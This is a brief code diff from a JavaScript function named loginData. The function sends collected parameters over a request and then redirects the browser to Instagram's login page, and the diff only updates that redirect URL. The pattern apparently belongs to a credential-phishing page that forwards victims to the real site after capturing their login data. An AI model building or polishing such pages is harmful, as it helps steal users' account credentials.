@@ -108,6 +108,6 @@ function loginData() {
 
     request.send(JSON.stringify(params));
     
-    window.location.href = "https://www.instagram.com/login"
+    window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav"
     console.log(messaggio)
 }
